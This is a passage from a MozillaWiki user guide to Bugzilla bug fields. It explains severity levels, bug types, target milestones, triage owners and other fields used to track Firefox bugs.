| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


